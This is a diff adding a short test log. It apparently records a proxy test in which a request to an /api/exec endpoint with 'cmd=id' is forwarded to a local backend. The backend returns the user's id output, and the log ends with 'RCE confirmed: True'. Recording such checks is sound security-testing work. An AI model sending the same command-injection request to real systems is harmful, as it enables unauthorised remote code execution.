@@ -1,0 +1,9 @@
+check-config rc 0 
+build        : 2usd-recovery
+form         : uri  pass: http://backend/
+client req   : b'GET /api/exec?cmd=id%20x HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n'
+upstream head: b'GET /exec?cmd=id%20x HTTP/1.0\r\nHost: 127.0.0.1:33117\r\nConnection: close\r\n\r\n'
+status       : HTTP/1.1 200 OK
+body         : uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+RCE confirmed: True
